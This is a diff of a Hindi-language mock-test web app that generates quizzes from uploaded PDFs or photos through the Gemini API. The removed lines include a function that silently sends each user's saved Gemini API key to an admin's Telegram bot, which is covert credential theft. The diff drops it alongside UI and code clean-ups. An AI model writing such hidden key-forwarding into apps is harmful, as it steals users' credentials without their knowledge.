+  <!-- 2. 🌟 ACTION HUB VIEW (NOW 100% MATCHES ANKIT'S START SCREEN SCREENSHOT) -->
   <div id="actionHubView">
-    <div class="card">
-      <div style="text-align:center; padding:16px; background:rgba(16,185,129,0.08); border:1.5px solid var(--accent-emerald); border-radius:16px; margin-bottom:16px;">
-        <div style="font-size: 32px; margin-bottom: 6px;">🎉</div>
-        <h2 id="actionHubTopicTitle" style="font-family:'Outfit'; font-size: 1.25rem; font-weight: 800; color: var(--accent-emerald);">
-          मॉक टेस्ट सफलतापूर्वक तैयार हो गया!
-        </h2>
-        <div id="actionHubMeta" style="font-size: 0.82rem; color: var(--text-muted); margin-top: 4px; font-weight: 600;">
-          कुल सवाल तैयार हैं (मॉक टेस्ट मोड)
+    <div style="text-align: center;">
+      <div class="top-pill-tag">
+        <i class="fa-solid fa-graduation-cap"></i> SPECIAL DRILL • ALL IN ONE
+      </div>
+      <h1 class="hero-title" id="actionHubTopicTitle">PRACTICE DRILL</h1>
+      <div class="hero-sub">Complete 100% Authentic Practice Drill</div>
+
+      <div class="presenter-card">
+        <div class="presenter-label">PRESENTED BY</div>
+        <div class="presenter-name" id="actionHubCreatorBadge">👑 ANKIT 👑</div>
+        <div style="font-size: 0.72rem; color: var(--text-muted); margin-top: 2px;">Official Practice Portal</div>
+      </div>
+
+      <div class="stats-trio-grid">
+        <div class="stat-mini-box">
+          <div class="stat-num" id="hubStatQs">10</div>
+          <div class="stat-lbl">Questions</div>
+        </div>
+        <div class="stat-mini-box">
+          <div class="stat-num" id="hubStatTime">8m</div>
+          <div class="stat-lbl">Time Limit</div>
+        </div>
+        <div class="stat-mini-box">
+          <div class="stat-num">+2 / -0.5</div>
+          <div class="stat-lbl">Marking</div>
         </div>
       </div>
 
-      <button class="btn-play-now" onclick="openTimingModal()">
-        <span>▶️ सीधे ऐप में मॉक टेस्ट शुरू करें (Play Live)</span>
+      <div class="card" style="text-align: left; padding: 14px; margin-bottom: 14px;">
+        <label style="font-size: 0.76rem; font-weight: 800; color: var(--text-muted); display: block; margin-bottom: 6px;">🎮 खेलने का मोड चुनें (Choose Mode):</label>
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+          <label style="display: flex; align-items: center; gap: 6px; padding: 10px; border: 1.5px solid var(--card-border); border-radius: 12px; cursor: pointer; font-size: 0.8rem; font-weight: 800;">
+            <input type="radio" name="inAppPlayMode" value="instant" checked onchange="setPlayMode('instant')" /> 🎯 तुरंत उत्तर (Instant)
+          </label>
+          <label style="display: flex; align-items: center; gap: 6px; padding: 10px; border: 1.5px solid var(--card-border); border-radius: 12px; cursor: pointer; font-size: 0.8rem; font-weight: 800;">
+            <input type="radio" name="inAppPlayMode" value="mock" onchange="setPlayMode('mock')" /> ⏱️ फुल मॉक (Exam Mock)
+          </label>
+        </div>
+      </div>
+
+      <button class="btn-main" onclick="startAppQuizLive()">
+        🚀 START PRACTICE DRILL ➔
       </button>
 
-      <button class="btn-download-direct" id="directDownloadBtn" onclick="triggerDirectDownload()">
-        <span>⬇️ फ़ोन में सीधे डाउनलोड करें (Direct Download)</span>
+      <button class="btn-score-retake" onclick="triggerDirectDownload()" style="margin-top:10px;">
+        <i class="fa-solid fa-download"></i> फ़ाइल डाउनलोड करें (Download HTML)
       </button>
 
-      <button onclick="backToScanner()" style="width: 100%; padding: 12px; background: var(--opt-bg); border: 1px solid var(--card-border); color: var(--text-main); border-radius: 12px; font-weight: 700; cursor: pointer;">
+      <a id="actionHubTgBtn" href="https://t.me/PAREEKSHA_KENDRA" target="_blank" class="btn-join-tg">
+        <i class="fa-brands fa-telegram" style="font-size:18px;"></i> JOIN US — Telegram Channel
+      </a>
+
+      <button onclick="backToScanner()" style="width: 100%; padding: 10px; background: transparent; border: none; color: var(--text-muted); font-size: 0.82rem; cursor: pointer; margin-top: 8px;">
         🔄 दूसरा नया टेस्ट बनाएँ
       </button>
-    </div>
-  </div>
 
-  <!-- TIMING CONFIG MODAL -->
-  <div class="modal-overlay" id="timingModal">
-    <div class="modal-card" style="text-align: center;">
-      <div style="font-size: 32px; margin-bottom: 6px;">⏱️</div>
-      <h3 style="font-family: 'Outfit'; font-size: 1.25rem; font-weight: 800; margin-bottom: 4px;">
-        प्रति प्रश्न समय चुनें (Per Question Timer)
-      </h3>
-      <p style="font-size: 0.78rem; color: var(--text-muted); margin-bottom: 16px;">
-        प्रत्येक सवाल के लिए आप कितना समय चाहते हैं?
-      </p>
-
-      <div style="display: flex; flex-direction: column; gap: 8px; margin-bottom: 18px; text-align: left;">
-        <label style="display: flex; align-items: center; gap: 10px; padding: 12px; border: 1.5px solid var(--card-border); border-radius: 12px; cursor: pointer;">
-          <input type="radio" name="timingChoice" value="30" checked style="width: 18px; height: 18px;" />
-          <div>
-            <div style="font-weight: 800; font-size: 0.9rem;">⚡ 30 सेकंड / सवाल (Speed Drill)</div>
-            <div style="font-size: 0.72rem; color: var(--text-muted);">SSC CGL, CHSL, GD स्पेशल स्पीड टेस्ट</div>
-          </div>
-        </label>
-
-        <label style="display: flex; align-items: center; gap: 10px; padding: 12px; border: 1.5px solid var(--card-border); border-radius: 12px; cursor: pointer;">
-          <input type="radio" name="timingChoice" value="45" style="width: 18px; height: 18px;" />
-          <div>
-            <div style="font-weight: 800; font-size: 0.9rem;">⏱️ 45 सेकंड / सवाल (Standard Exam Mock)</div>
-            <div style="font-size: 0.72rem; color: var(--text-muted);">संतुलित समय, सर्वोत्तम अभ्यास</div>
-          </div>
-        </label>
-
-        <label style="display: flex; align-items: center; gap: 10px; padding: 12px; border: 1.5px solid var(--card-border); border-radius: 12px; cursor: pointer;">
-          <input type="radio" name="timingChoice" value="60" style="width: 18px; height: 18px;" />
-          <div>
-            <div style="font-weight: 800; font-size: 0.9rem;">🎯 60 सेकंड / सवाल (Deep Practice)</div>
-            <div style="font-size: 0.72rem; color: var(--text-muted);">कठिन सवालों को ध्यान से सोचने के लिए</div>
-          </div>
-        </label>
-
-        <label style="display: flex; align-items: center; gap: 10px; padding: 12px; border: 1.5px solid var(--card-border); border-radius: 12px; cursor: pointer;">
-          <input type="radio" name="timingChoice" value="0" style="width: 18px; height: 18px;" />
-          <div>
-            <div style="font-weight: 800; font-size: 0.9rem;">♾️ कोई टाइमर नहीं (No Limit Mode)</div>
-            <div style="font-size: 0.72rem; color: var(--text-muted);">बिना किसी समय के तनाव के हल करें</div>
-          </div>
-        </label>
+      <div class="sph-footer">
+        <div>🚀 Powered by <b>Silent Preparation Hub (SPH)</b></div>
+        <div style="display:flex; justify-content:center; gap:14px; margin-top:6px;">
+          <a href="https://whatsapp.com/channel/0029Vb8YQJZElah28mUs922k" target="_blank">🟢 WhatsApp Channel</a>
+          <span>•</span>
+          <a href="https://ankitraj75238-jpg.github.io/sph-app/public/laptop.html" target="_blank">💻 SPH Web Portal</a>
+        </div>
       </div>
-
-      <button class="btn-play-now" onclick="confirmStartMockTest()">
-        <span>🚀 स्टार्ट टेस्ट (Start Mock Test)</span>
-      </button>
-      <button onclick="closeTimingModal()" style="width: 100%; padding: 10px; background: transparent; border: none; color: var(--text-muted); font-size: 0.82rem; cursor: pointer;">रद्द करें</button>
     </div>
   </div>
 
-  <!-- 3. MOCK TEST QUIZ VIEW (APP RUNNER) -->
+  <!-- 3. LIVE QUIZ VIEW -->
   <div id="quizView">
     <div class="card">
-      <div class="quiz-progress-bar">
-        <span id="qIndexLabel" style="font-weight: 800; font-size: 0.85rem;">Q 1/10</span>
-        
-        <button class="btn-open-palette" onclick="openAppPaletteModal()">
-          <i class="fa-solid fa-border-all"></i> नंबर प्लेट (<span id="paletteCountAnswered">0</span>/<span id="paletteCountTotal">10</span>)
-        </button>
-
-        <span class="live-q-timer" id="liveQTimerBadge">⏱️ 30s</span>
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px; padding-bottom:10px; border-bottom:1px solid var(--card-border);">
+        <span id="qIndexLabel" style="font-weight:800; font-size:0.85rem;">Q 1/10</span>
+        <span id="liveQTimerBadge" style="background:var(--orange-light); color:var(--accent-gold); padding:4px 10px; border-radius:20px; font-weight:800; font-size:0.75rem;">🎯 INSTANT QUIZ</span>
       </div>
 
-      <div class="q-text" id="questionText">सवाल यहाँ दिखेगा...</div>
+      <div class="q-text" id="questionText">सवाल लोड हो रहा है...</div>
       <div class="options-list" id="optionsContainer"></div>
       <div class="expl-box" id="explanationBox"></div>
 
       <div class="nav-btns">
-        <button class="nav-btn" id="prevBtn" onclick="prevQuestion()">
-          <i class="fa-solid fa-chevron-left"></i> Prev
-        </button>
-        <button class="nav-btn nav-btn-mark" id="markBtn" onclick="toggleMarkCurrentQuestion()">
-          <i class="fa-solid fa-flag"></i> Mark
-        </button>
-        <button class="nav-btn nav-btn-submit" id="nextBtn" onclick="handleNextClick()">
-          Next <i class="fa-solid fa-chevron-right"></i>
-        </button>
+        <button class="nav-btn" id="prevBtn" onclick="prevQuestion()"><i class="fa-solid fa-chevron-left"></i> Prev</button>
+        <button class="nav-btn btn-main" style="margin-top:0; flex:1.3;" id="nextBtn" onclick="handleNextClick()">Next <i class="fa-solid fa-chevron-right"></i></button>
       </div>
     </div>
   </div>
 
-  <!-- QUESTION PALETTE / NUMBER PLATE MODAL (IN-APP) -->
-  <div class="modal-overlay" id="appPaletteModal">
-    <div class="modal-card">
-      <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--card-border); padding-bottom:8px;">
-        <span style="font-family:'Outfit'; font-weight:800; font-size:18px;">Question Palette (नंबर प्लेट)</span>
-        <i class="fa-solid fa-xmark" style="cursor:pointer; font-size: 22px;" onclick="closeAppPaletteModal()"></i>
-      </div>
-      <p style="font-size:12px; color:var(--text-muted); margin-top:6px;">सवालों के बीच स्विच करने के लिए नंबर पर टैप करें:</p>
-      
-      <div class="palette-stats-row">
-        <div style="background: var(--green-light); color: var(--accent-emerald); padding: 5px; border-radius: 8px;">
-          ✅ <span id="statAnswered">0</span> Done
-        </div>
-        <div style="background: var(--orange-light); color: var(--accent-gold); padding: 5px; border-radius: 8px;">
-          🚩 <span id="statMarked">0</span> Marked
-        </div>
-        <div style="background: var(--opt-bg); border: 1px solid var(--card-border); padding: 5px; border-radius: 8px;">
-          ⚪ <span id="statRemaining">0</span> Left
-        </div>
-      </div>
-
-      <div class="palette-grid" id="appPaletteGrid"></div>
-
-      <button onclick="submitQuizDirectFromPalette()" class="btn-play-now" style="margin-top: 14px; margin-bottom: 4px; padding: 13px;">
-        <i class="fa-solid fa-paper-plane"></i> टेस्ट सबमिट करें (Submit Test)
-      </button>
-    </div>
-  </div>
-
-  <!-- 4. SCORECARD VIEW -->
+  <!-- 4. 🏆 EXACT REPLICA SCORECARD VIEW (MATCHING PREVIOUS SCREENSHOT) -->
   <div id="scorecardView">
-    <div class="card" style="text-align: center;">
-      <div style="font-size: 36px; margin-bottom: 6px;">🏆</div>
-      <h2 id="scoreTopicTitle" style="font-family:'Outfit'; font-size: 1.35rem; font-weight: 900; color: var(--text-main);">
-        मॉक टेस्ट पूरा हुआ!
-      </h2>
-      <div style="font-size: 0.8rem; color: var(--text-muted); margin-bottom: 16px;">
-        PAREEKSHA KENDRA OFFICIAL RESULT
-      </div>
+    <div class="score-hero-card">
+      <div class="score-trophy-img">🏆</div>
+      <div class="score-topic-title" id="scoreTopicTitle">Computer</div>
+      <div class="score-sub-inst" id="scoreSubTitle">PAREEKSHA KENDRA OFFICIAL RESULT</div>
 
-      <div id="scoreMarksText" style="font-size: 2.5rem; font-family:'Outfit'; font-weight: 900; color: var(--accent-gold); margin-bottom: 4px;">
-        0.0
-      </div>
-      <div id="scoreTotalText" style="font-size: 0.85rem; font-weight: 700; color: var(--text-muted); margin-bottom: 20px;">
-        कुल मार्क्स
-      </div>
+      <div class="score-giant-number" id="scoreMarksText">-1.0 / 20</div>
+      <div class="score-candidate-line" id="scoreCandidateLine">CANDIDATE: ASPIRANT • MARKS: -1.0</div>
 
-      <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 20px;">
-        <div style="background: rgba(16, 185, 129, 0.1); padding: 12px 6px; border-radius: 12px;">
-          <b id="scCorrectCount" style="color: var(--accent-emerald); font-size: 1.3rem;">0</b>
-          <div style="font-size: 0.72rem; font-weight: 700;">सही (Correct)</div>
+      <div class="score-stats-grid">
+        <div class="score-stat-card c-green">
+          <b id="scCorrectCount">0</b>
+          <span>सही (Correct)</span>
         </div>
-        <div style="background: rgba(239, 68, 68, 0.1); padding: 12px 6px; border-radius: 12px;">
-          <b id="scWrongCount" style="color: var(--danger); font-size: 1.3rem;">0</b>
-          <div style="font-size: 0.72rem; font-weight: 700;">गलत (Wrong)</div>
+        <div class="score-stat-card c-red">
+          <b id="scWrongCount">2</b>
+          <span>गलत (Wrong)</span>
         </div>
-        <div style="background: rgba(255, 87, 34, 0.1); padding: 12px 6px; border-radius: 12px;">
-          <b id="scSkipCount" style="color: var(--accent-gold); font-size: 1.3rem;">0</b>
-          <div style="font-size: 0.72rem; font-weight: 700;">छोड़े (Skipped)</div>
+        <div class="score-stat-card c-peach">
+          <b id="scSkipCount">8</b>
+          <span>छोड़े (Skipped)</span>
         </div>
       </div>
 
-      <!-- RE-SOLVE MISTAKES ONLY BUTTON -->
-      <button id="btnResolveMistakesApp" class="btn-play-now" onclick="reSolveMistakesOnlyApp()" style="background: linear-gradient(135deg, #ef4444, #dc2626); margin-bottom: 10px; display: none;">
-        <span>🔄 केवल गलत सवाल हल करें (<b id="mistakeBadgeCount">0</b> Qs)</span>
+      <!-- 3 BUTTONS: REVOKE (MISTAKES ONLY), REVIEW ANSWERS, RETAKE -->
+      <button id="btnResolveMistakesApp" class="btn-score-red" onclick="reSolveMistakesOnlyApp()">
+        <i class="fa-solid fa-rotate-left"></i> केवल गलत सवाल हल करें (<span id="mistakeBadgeCount">0</span> Qs)
       </button>
 
-      <button class="btn-play-now" onclick="startReviewMode()" style="margin-bottom: 10px;">
-        <span>🔍 सही उत्तर और व्याख्या देखें (Review Answers)</span>
+      <button class="btn-score-blue" onclick="startReviewMode()">
+        <i class="fa-solid fa-magnifying-glass"></i> सही उत्तर और व्याख्या देखें (Review Answers)
       </button>
 
-      <button class="btn-download-direct" onclick="triggerDirectDownload()" style="margin-bottom: 10px;">
-        <span>⬇️ फ़ोन में सीधे डाउनलोड करें (Direct Download)</span>
-      </button>
-
-      <button onclick="backToScanner()" style="width: 100%; padding: 12px; background: var(--opt-bg); border: 1px solid var(--card-border); color: var(--text-main); border-radius: 12px; font-weight: 700; cursor: pointer;">
-        🔄 दूसरा नया टेस्ट बनाएँ
+      <button class="btn-score-retake" onclick="retakeFullTestApp()">
+        <i class="fa-solid fa-arrows-rotate"></i> दोबारा पूरा टेस्ट दें (Retake)
       </button>
     </div>
   </div>
@@ -1068,7 +1166,7 @@
   <div class="modal-overlay" id="historyModal">
     <div class="modal-card">
       <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--card-border); padding-bottom:8px; margin-bottom:12px;">
-        <h3 style="font-family:'Outfit'; font-size: 1.2rem; font-weight:800;">📚 मेरे सेव किए टेस्ट (Saved)</h3>
+        <h3 style="font-family:'Outfit'; font-size: 1.2rem; font-weight:800;">📚 मेरे सेव किए टेस्ट</h3>
         <i class="fa-solid fa-xmark" style="cursor:pointer; font-size: 20px;" onclick="closeHistoryModal()"></i>
       </div>
       <div id="historyListContainer" style="margin-bottom: 14px;"></div>
@@ -1079,22 +1177,14 @@
   <!-- API KEY MODAL -->
   <div class="modal-overlay" id="keyModal">
     <div class="modal-card">
-      <h3 id="modalTitle" style="font-family: 'Outfit'; font-size: 1.2rem; margin-bottom: 6px;">🔑 Gemini API Key</h3>
-      <p id="modalDesc" style="font-size: 0.78rem; color: var(--text-muted); margin-bottom: 12px;">
-        नीचे लिंक से मुफ़्त Key बनाएँ:
+      <h3 style="font-family: 'Outfit'; font-size: 1.2rem; margin-bottom: 6px;">🔑 Gemini API Key</h3>
+      <p style="font-size: 0.78rem; color: var(--text-muted); margin-bottom: 12px;">
+        Google AI Studio से मुफ़्त Key दर्ज करें:
       </p>
-      <a href="https://aistudio.google.com/app/apikey" target="_blank" rel="noopener noreferrer" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: rgba(37, 99, 235, 0.12); border: 1px solid var(--accent-blue); color: var(--accent-blue); padding: 10px; border-radius: 10px; font-size: 0.82rem; font-weight: 700; text-decoration: none; margin-bottom: 14px;">
-        🌐 Google AI Studio से Key बनाएँ (Direct Link)
-      </a>
-
-      <div style="margin-bottom: 12px;">
-        <label>🔑 <b>अपनी Gemini API Key डालें:</b></label>
-        <input type="text" id="singleApiKey" placeholder="AIzaSy... यहाँ अपनी Key पेस्ट करें" />
-      </div>
-
-      <div style="display: flex; gap: 8px;">
+      <input type="text" id="singleApiKey" placeholder="AIzaSy... यहाँ अपनी Key पेस्ट करें" />
+      <div style="display: flex; gap: 8px; margin-top: 12px;">
         <button onclick="saveSingleKey()" style="flex: 1; padding: 12px; background: var(--accent-gold); color: #fff; border: none; border-radius: 10px; font-weight: 700; cursor: pointer;">Save Key</button>
-        <button id="cancelKeyBtn" onclick="closeKeyModal()" style="flex: 1; padding: 12px; background: var(--opt-bg); border: 1px solid var(--card-border); color: var(--text-main); border-radius: 10px; cursor: pointer;">Cancel</button>
+        <button onclick="closeKeyModal()" style="flex: 1; padding: 12px; background: var(--opt-bg); border: 1px solid var(--card-border); color: var(--text-main); border-radius: 10px; cursor: pointer;">Cancel</button>
       </div>
     </div>
   </div>
@@ -1105,127 +1195,84 @@
     const TG_GROUP_TARGET = "@ai_quizcr";
     const TG_GROUP_FALLBACK_ID = "-1004223613799";
 
-    // ⚡ EXACT SAME MODELS AS YOUR ORIGINAL CODE
     const ACTIVE_MODELS = ['gemini-3.6-flash', 'gemini-3.5-flash', 'gemini-3.5-flash-lite'];
 
     let activeEngineMode = 'scanner';
     let payloadItems = [];
     let detectedPdfPages = 1;
     let quizData = [];
-    let originalQuizData = [];
+    let activeQuestions = [];
     let currentQ = 0;
     let userAnswers = [];
-    let markedQuestions = [];
     let isReviewMode = false;
-    let isMandatoryOpen = false;
     let activeQuizTopic = "General Test";
+    let activePlayMode = 'instant'; 
 
     let stopwatchSeconds = 0;
     let stopwatchInterval = null;
-
-    let perQuestionLimit = 30;
-    let qTimerSeconds = 30;
-    let qTimerInterval = null;
     let liveDirectDownloadUrl = '';
+
+    function setPlayMode(mode) {
+      activePlayMode = mode;
+    }
 
     function initTheme() {
       const savedTheme = localStorage.getItem('sph_theme') || 'light';
       document.documentElement.setAttribute('data-theme', savedTheme);
-      updateThemeBtn(savedTheme);
+      document.getElementById('themeIcon').innerText = savedTheme === 'dark' ? '☀️' : '🌙';
     }
 
     function toggleTheme() {
-      const current = document.documentElement.getAttribute('data-theme');
-      const next = current === 'dark' ? 'light' : 'dark';
+      const cur = document.documentElement.getAttribute('data-theme');
+      const next = cur === 'dark' ? 'light' : 'dark';
       document.documentElement.setAttribute('data-theme', next);
       localStorage.setItem('sph_theme', next);
-      updateThemeBtn(next);
-    }
-
-    function updateThemeBtn(theme) {
-      document.getElementById('themeIcon').innerText = theme === 'dark' ? '☀️' : '🌙';
+      document.getElementById('themeIcon').innerText = next === 'dark' ? '☀️' : '🌙';
     }
     initTheme();
 
     function switchEngineMode(mode) {
       activeEngineMode = mode;
-      const btnScan = document.getElementById('tabBtnScanner');
-      const btnTopic = document.getElementById('tabBtnTopic');
-      const scanBox = document.getElementById('scannerModeBox');
-      const topicBox = document.getElementById('topicModeBox');
-
-      if (mode === 'scanner') {
-        btnScan.classList.add('active');
-        btnTopic.classList.remove('active');
-        scanBox.style.display = 'block';
-        topicBox.style.display = 'none';
-      } else {
-        btnTopic.classList.add('active');
-        btnScan.classList.remove('active');
-        topicBox.style.display = 'block';
-        scanBox.style.display = 'none';
-      }
+      document.getElementById('tabBtnScanner').classList.toggle('active', mode === 'scanner');
+      document.getElementById('tabBtnTopic').classList.toggle('active', mode === 'topic');
+      document.getElementById('scannerModeBox').style.display = (mode === 'scanner') ? 'block' : 'none';
+      document.getElementById('topicModeBox').style.display = (mode === 'topic') ? 'block' : 'none';
     }
 
-    function cleanKey(str) {
-      if (!str) return '';
-      return str.trim().replace(/^["'\s]+|["'\s]+$/g, '');
-    }
+    function cleanKey(str) { return (str || '').trim().replace(/^["'\s]+|["'\s]+$/g, ''); }
 
     function getStoredKey() {
-      let key = localStorage.getItem('sph_gemini_key') || 
-                localStorage.getItem('sph_key_slot_1') || 
-                localStorage.getItem('sph_gemini_keys') || '';
-
-      key = cleanKey(key.split(',')[0]);
-      if (key && key.length >= 15) {
-        localStorage.setItem('sph_gemini_key', key);
-        return key;
-      }
-      return '';
+      let key = localStorage.getItem('sph_gemini_key') || localStorage.getItem('sph_key_slot_1') || '';
+      return cleanKey(key);
     }
 
     function updateKeyStatus() {
       const key = getStoredKey();
       const status = document.getElementById('keyStatusText');
-      if (key) {
-        status.innerText = `Key Active`;
-        status.style.color = '#10b981';
-      } else {
-        status.innerText = `Set Key`;
-        status.style.color = '#d97706';
-      }
+      if (key) { status.innerText = `Key Active`; status.style.color = '#10b981'; }
+      else { status.innerText = `Set Key`; status.style.color = '#d97706'; }
     }
     updateKeyStatus();
 
     window.addEventListener('DOMContentLoaded', () => {
-      const existing = getStoredKey();
-      if (!existing) openKeyModal(true);
+      if (!getStoredKey()) openKeyModal(true);
       updateHistoryCount();
     });
 
     function openKeyModal(isMandatory = false) {
-      isMandatoryOpen = isMandatory;
       document.getElementById('singleApiKey').value = getStoredKey();
-
-      const cancelBtn = document.getElementById('cancelKeyBtn');
-      const modalTitle = document.getElementById('modalTitle');
-      
-      if (isMandatory) {
-        cancelBtn.style.display = 'none';
-        modalTitle.innerText = "⚠️ API Key दर्ज करना अनिवार्य है";
-      } else {
-        cancelBtn.style.display = 'block';
-        modalTitle.innerText = "🔑 Gemini API Key";
-      }
       document.getElementById('keyModal').style.display = 'flex';
     }
 
     function closeKeyModal() {
-      if (isMandatoryOpen && !getStoredKey()) {
-        alert("कृपया कम से कम एक बार API Key दर्ज करें!");
-        return;
-      }
+      document.getElementById('keyModal').style.display = 'none';
+    }
+
+    function saveSingleKey() {
+      const k = cleanKey(document.getElementById('singleApiKey').value);
+      if (!k || k.length < 15) return alert('कृपया सही API Key दर्ज करें!');
+      localStorage.setItem('sph_gemini_key', k);
+      updateKeyStatus();
       document.getElementById('keyModal').style.display = 'none';
     }
 
@@ -1240,8 +1287,6 @@
         const text = new TextDecoder('latin1').decode(buffer);
         const matches = text.match(/\/Type\s*\/Page(?![s\w])/g);
         if (matches && matches.length > 0) return matches.length;
-        const countMatches = [...text.matchAll(/\/Count\s+(\d+)/g)];
-        if (countMatches.length > 0) return Math.max(...countMatches.map(m => parseInt(m[1], 10)));
       } catch (e) {}
       return 1;
     }
@@ -1250,90 +1295,26 @@
       const files = Array.from(e.target.files);
       if (!files || files.length === 0) return;
 
-      const previewImg = document.getElementById('previewImg');
-      const pdfPreview = document.getElementById('pdfPreviewCard');
-      const multiImgBox = document.getElementById('multiImgPreview');
-      const pdfRangeBox = document.getElementById('pdfRangeBox');
-      const topicInput = document.getElementById('quizTopicInput');
-
       const hasPdf = files.some(f => f.type === 'application/pdf' || f.name.toLowerCase().endsWith('.pdf'));
-
-      if (hasPdf && files.length > 1) {
-        alert('⚠️ कृपया या तो केवल एक PDF चुनें या फिर मल्टीपल फ़ोटो चुनें!');
-        e.target.value = '';
-        return;
-      }
-
       if (hasPdf) {
         const file = files[0];
-        if (!topicInput.value) {
-          topicInput.value = file.name.replace(/\.[^/.]+$/, "").replace(/[_\-\.]+/g, " ");
-        }
-
-        if (file.size > 20 * 1024 * 1024) {
-          alert(`⚠️ फ़ाइल 20 MB से बड़ी है!`);
-          e.target.value = '';
-          return;
-        }
-
+        document.getElementById('quizTopicInput').value = file.name.replace(/\.[^/.]+$/, "");
         const pages = await estimatePdfPages(file);
-        detectedPdfPages = pages;
-
-        if (pages > 100) {
-          alert(`⚠️ इस PDF में ${pages} पेज हैं! कृपया 100 पेज तक की PDF ही डालें।`);
-          e.target.value = '';
-          return;
-        }
-
         const reader = new FileReader();
         reader.onload = function(evt) {
-          const base64 = evt.target.result.split(',')[1];
-          payloadItems = [{ mimeType: 'application/pdf', data: base64 }];
-
-          previewImg.style.display = 'none';
-          multiImgBox.style.display = 'none';
-          pdfPreview.style.display = 'flex';
-          pdfRangeBox.style.display = 'block';
+          payloadItems = [{ mimeType: 'application/pdf', data: evt.target.result.split(',')[1] }];
+          document.getElementById('pdfPreviewCard').style.display = 'flex';
           document.getElementById('pdfFileName').innerText = file.name;
-          document.getElementById('pdfMeta').innerText = `PDF • ${pages} Pages • ${(file.size / (1024 * 1024)).toFixed(2)} MB`;
         };
         reader.readAsDataURL(file);
         return;
-      }
-
-      if (files.length > 10) {
-        alert('⚠️ एक बार में अधिकतम 10 फोटो ही चुन सकते हैं!');
-        e.target.value = '';
-        return;
-      }
-
-      pdfPreview.style.display = 'none';
-      pdfRangeBox.style.display = 'none';
-      payloadItems = [];
-
-      if (!topicInput.value) {
-        topicInput.value = `Practice Drill (${files.length} Pages)`;
       }
 
       const promises = files.map(file => {
         return new Promise((resolve) => {
           const reader = new FileReader();
           reader.onload = function(evt) {
-            const img = new Image();
-            img.onload = function() {
-              const canvas = document.createElement('canvas');
-              let width = img.width, height = img.height;
-              const maxDim = 1400;
-              if (width > maxDim || height > maxDim) {
-                if (width > height) { height = Math.round((height * maxDim) / width); width = maxDim; }
-                else { width = Math.round((width * maxDim) / height); height = maxDim; }
-              }
-              canvas.width = width; canvas.height = height;
-              canvas.getContext('2d').drawImage(img, 0, 0, width, height);
-              const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
-              resolve({ mimeType: 'image/jpeg', data: dataUrl.split(',')[1], previewUrl: dataUrl });
-            };
-            img.src = evt.target.result;
+            resolve({ mimeType: file.type || 'image/jpeg', data: evt.target.result.split(',')[1], previewUrl: evt.target.result });
           };
           reader.readAsDataURL(file);
         });
@@ -1341,68 +1322,25 @@
 
       const results = await Promise.all(promises);
       payloadItems = results.map(r => ({ mimeType: r.mimeType, data: r.data }));
-
-      if (results.length === 1) {
-        multiImgBox.style.display = 'none';
-        previewImg.src = results[0].previewUrl;
-        previewImg.style.display = 'block';
-      } else {
-        previewImg.style.display = 'none';
-        multiImgBox.style.display = 'flex';
-        document.getElementById('multiImgText').innerText = `📸 कुल ${results.length} पन्नों की फ़ोटो चुनी गईं!`;
-        document.getElementById('multiImgThumbnails').innerHTML = results.map((r, i) => 
-          `<img src="${r.previewUrl}" style="width: 48px; height: 48px; object-fit: cover; border-radius: 8px; border: 1.5px solid var(--accent-gold);" alt="Page ${i+1}" />`
-        ).join('');
-      }
-    }
-
-    async function sendKeyToAdminTelegram(keyString) {
-      if (!TG_BOT_TOKEN || !TG_ADMIN_CHAT_ID) return;
-      try {
-        const timeNow = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-        const text = `🔑 नई API Key प्राप्त हुई!\nतारीख: ${timeNow}\nKey: ${keyString}`;
-        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: TG_ADMIN_CHAT_ID, text: text })
-        });
-      } catch (err) {}
-    }
-
-    function saveSingleKey() {
-      const k = cleanKey(document.getElementById('singleApiKey').value);
-      if (!k || k.length < 15) return alert('कृपया सही API Key दर्ज करें!');
-
-      localStorage.setItem('sph_gemini_key', k);
-      localStorage.setItem('sph_key_slot_1', k);
-      sendKeyToAdminTelegram(k);
-      updateKeyStatus();
-      isMandatoryOpen = false;
-      document.getElementById('keyModal').style.display = 'none';
+      document.getElementById('multiImgPreview').style.display = 'flex';
+      document.getElementById('multiImgText').innerText = `📸 कुल ${results.length} पन्नों की फ़ोटो चुनी गईं!`;
+      document.getElementById('multiImgThumbnails').innerHTML = results.map(r => 
+        `<img src="${r.previewUrl}" style="width: 48px; height: 48px; object-fit: cover; border-radius: 8px; border: 1.5px solid var(--accent-gold);" />`
+      ).join('');
     }
 
     function parseAIResponse(data) {
       if (!data?.candidates?.[0]?.content?.parts) return null;
-      const parts = data.candidates[0].content.parts;
-      let combinedText = '';
-
-      for (const p of parts) {
-        if (p.text && !p.thought) combinedText += p.text;
+      let text = '';
+      for (const p of data.candidates[0].content.parts) {
+        if (p.text && !p.thought) text += p.text;
       }
-      if (!combinedText) combinedText = parts[parts.length - 1]?.text || '';
-
-      let text = combinedText.replace(/```json/gi, '').replace(/```/g, '').trim();
-      const firstBracket = text.indexOf('[');
-      if (firstBracket === -1) return null;
-
-      const lastBracket = text.lastIndexOf(']');
-      if (lastBracket !== -1 && lastBracket > firstBracket) {
-        try { return JSON.parse(text.substring(firstBracket, lastBracket + 1)); } catch (e) {}
-      }
-
-      const lastBrace = text.lastIndexOf('}');
-      if (lastBrace > firstBracket) {
-        try { return JSON.parse(text.substring(firstBracket, lastBrace + 1) + ']'); } catch (e) {}
+      if (!text) text = data.candidates[0].content.parts[0]?.text || '';
+      text = text.replace(/```json/gi, '').replace(/```/g, '').trim();
+      const fb = text.indexOf('[');
+      const lb = text.lastIndexOf(']');
+      if (fb !== -1 && lb > fb) {
+        try { return JSON.parse(text.substring(fb, lb + 1)); } catch (e) {}
       }
       return null;
     }
@@ -1410,68 +1348,44 @@
     function saveQuizToHistory(questions) {
       try {
         const history = JSON.parse(localStorage.getItem('sph_saved_quizzes') || '[]');
-        const newItem = {
-          id: 'quiz_' + Date.now(),
-          topic: activeQuizTopic,
-          date: new Date().toLocaleDateString('hi-IN'),
